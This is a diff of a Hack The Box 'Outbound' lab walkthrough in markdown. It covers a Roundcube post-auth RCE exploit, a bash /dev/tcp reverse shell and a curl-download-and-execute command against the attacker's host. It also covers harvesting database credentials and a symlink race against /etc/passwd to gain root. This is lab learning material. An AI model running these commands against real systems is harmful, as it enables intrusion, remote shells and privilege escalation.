@@ -9,7 +9,7 @@ where:\
 `-sC` - Scan with default NSE scripts. Considered useful for discovery and safe.\
 `-sV` - Attempts to determine the version of the service running on port.
 
-The Output it produced is in the file - [Nmap output file]()
+The Output it produced is in the file - [Nmap output file](https://github.com/Nithin-vs/HTB-Labs-Docs/blob/main/Outbound/Nmap.txt)
 
 ## Step 2 - Opening in Browser
 Found HTTP 80 port open and editing the `/etc/hosts` file allow me to see the Login Page. But the login page does not have any type of common web vulnerabilities.
@@ -18,7 +18,7 @@ Instead making a vulnerability scanning using `Nuclei` gave me a vulnerability _
 > [!NOTE]
 > CVE‑2025‑49113 – Post‑Auth Remote Code Execution vulnerability in Roundcube
 
-The exploit script is found in "[github.com](https://github.com/hakaioffsec/CVE-2025-49113-exploit)", which is written in php.
+The exploit script is found in "[github](https://github.com/hakaioffsec/CVE-2025-49113-exploit)", which is written in php.
 
 ## Step 3 - Exploit
 The exploit of the vulnerability is using the post authentication remote code execution and run arbitary code afer authentication. The user creds are given
@@ -32,22 +32,22 @@ Now we need to make a reverse shell to get the foothold.
 That require a small payload which runs on the victim to provide us the shell. 
 1. Create a payload `exploit.sh` with 
 ```
-/bin/bash -i >& /dev/tcp/<attackbox ip>/443 0>&1
+/bin/bash -i >& /dev/tcp/<attackbox IP>/443 0>&1
 ``` 
 2. Host this via the `python3 -m http.server 80`
 3. Open the nc listener.
 4. Running the script,
 ```
-php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl 10.10.14.16/exploit.sh -o /tmp/nithin.sh && chmod +x /tmp/nithin.sh && /bin/bash -c /tmp/nithin.sh"
+php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh && chmod +x /tmp/nithin.sh && /bin/bash -c /tmp/nithin.sh"
 ```
-- `curl 10.10.14.16/exploit.sh -o /tmp/wither.sh` - Downloads your reverse shell script (exploit.sh) from your attacker machine and saves it to /tmp/nithin.sh on the victim.
-- `chmod +x /tmp/wither.sh` - Makes the script executable.
-- `/bin/bash -c /tmp/wither.sh` - Executes the script in a bash shell.
+- `curl <attackbox IP>/exploit.sh -o /tmp/nithin.sh` - Downloads your reverse shell script (exploit.sh) from your attacker machine and saves it to /tmp/nithin.sh on the victim.
+- `chmod +x /tmp/nithin.sh` - Makes the script executable.
+- `/bin/bash -c /tmp/nithin.sh` - Executes the script in a bash shell.
 
 5. Got the Shell.
 
 ## Step 4 - Digging 
-A crucial discovery was made in the Roundcube configuration file located at /var/www/html/roundcube/config/config.inc.php. This file contained the credentials for the application's database.
+A crucial discovery was made in the Roundcube configuration file located at `/var/www/html/roundcube/config/config.inc.php`. This file contained the credentials for the application's database.
 ```
 $config = [];
 
@@ -174,7 +174,7 @@ You are allowed to run any below command as root. Further enumeration revealed t
 
 
 > What’s a Symlink?\
-A symlink (short for symbolic link) is like a shortcut. It’s a special file that just points to another file. For example, if you make a symlink called link.txt that points to /etc/passwd, opening link.txt is the same as opening /etc/passwd.\
+A symlink (short for symbolic link) is like a shortcut. It’s a special file that just points to another file. For example, if you make a symlink called link.txt that points to /etc/passwd, opening link.txt is the same as opening /etc/passwd.
 >
 > What’s a Symlink Attack?\
 A symlink attack is when an attacker tricks a program into following a symlink that points to something sensitive—like a password file or system config.
@@ -183,7 +183,7 @@ A symlink attack is when an attacker tricks a program into following a symlink t
 
 The plan was to trick the below command into writing to `/etc/passwd` instead of its intended log file, `/var/log/below/error_root.log`. This required winning a race condition.
 
-> This Section is reffered from [Medium](https://medium.com/@divyanshusainialok/outbound-htb-walkthrough-c4b36fd4b194)
+> This Section is referred from [Medium](https://medium.com/@divyanshusainialok/outbound-htb-walkthrough-c4b36fd4b194)
 
 Here are the steps:
 1. Create a malicious user entry that would grant us root privileges and save it to a temporary file.
